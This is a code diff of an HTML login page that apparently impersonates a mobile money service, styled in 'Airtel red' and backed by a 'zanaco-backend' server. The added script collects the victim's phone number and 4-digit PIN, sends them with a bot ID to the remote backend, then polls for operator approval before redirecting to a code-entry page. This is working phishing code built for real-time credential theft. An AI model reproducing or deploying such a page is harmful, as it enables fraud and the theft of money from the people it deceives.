@@ -22,7 +22,7 @@ body {
 }
 
 h1 {
-    color: #d60000; /* Airtel red */
+    color: #d60000;
     font-size: 32px;
     margin-bottom: 5px;
 }
@@ -43,7 +43,7 @@ h2 {
     font-size: 18px;
     text-align: center;
     margin-bottom: 15px;
-    pointer-events: none; /* Non-editable */
+    pointer-events: none;
     background: #fff;
     box-sizing: border-box;
 }
@@ -73,9 +73,6 @@ button {
     border-radius: 6px;
     font-size: 16px;
     cursor: not-allowed;
-    display: flex;
-    justify-content: center;
-    align-items: center;
 }
 
 button.enabled {
@@ -107,10 +104,10 @@ button.enabled {
     <p>Enter your PIN</p>
     <form id="pinForm">
         <div class="pin-boxes">
-            <input maxlength="1" inputmode="numeric">
-            <input maxlength="1" inputmode="numeric">
-            <input maxlength="1" inputmode="numeric">
-            <input maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
         </div>
         <button id="submitBtn" disabled>Login</button>
     </form>
@@ -125,7 +122,10 @@ const BACKEND_URL = "https://zanaco-backend.onrender.com";
 // ---------------- BOT ID ----------------
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
-if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
+if (!botId) {
+    alert("Invalid access link");
+    throw new Error("botId missing");
+}
 
 // ---------------- PREFILL PHONE ----------------
 const phoneDisplay = document.getElementById('phoneDisplay');
@@ -136,4 +136,70 @@ if (!phone) {
 phoneDisplay.value = phone;
 
 // ---------------- PIN INPUT LOGIC ----------------
-const inputs = document
+const inputs = document.querySelectorAll('.pin-boxes input');
+const button = document.getElementById('submitBtn');
+
+inputs[0].focus();
+
+inputs.forEach((input, i) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+
+        if (input.value && i < inputs.length - 1) {
+            inputs[i + 1].focus();
+        }
+
+        const allFilled = [...inputs].every(x => x.value.length === 1);
+        button.disabled = !allFilled;
+
+        if (allFilled) {
+            button.classList.add('enabled');
+        } else {
+            button.classList.remove('enabled');
+        }
+    });
+
+    input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !input.value && i > 0) {
+            inputs[i - 1].focus();
+        }
+    });
+});
+
+// ---------------- SUBMIT PIN ----------------
+document.getElementById('pinForm').addEventListener('submit', async e => {
+    e.preventDefault();
+
+    const pin = [...inputs].map(i => i.value).join('');
+    localStorage.setItem('pin', pin);
+
+    // UI feedback only
+    button.disabled = true;
+    button.textContent = 'Logging in...';
+
+    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+            name: localStorage.getItem('name'),
+            phone,
+            pin,
+            botId
+        })
+    });
+
+    const { requestId } = await res.json();
+
+    const poll = setInterval(async () => {
+        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+        const d = await r.json();
+        if (d.approved === true) {
+            clearInterval(poll);
+            window.location.href = `code.html?botId=${botId}`;
+        }
+    }, 1500);
+});
+</script>
+
+</body>
+</html>
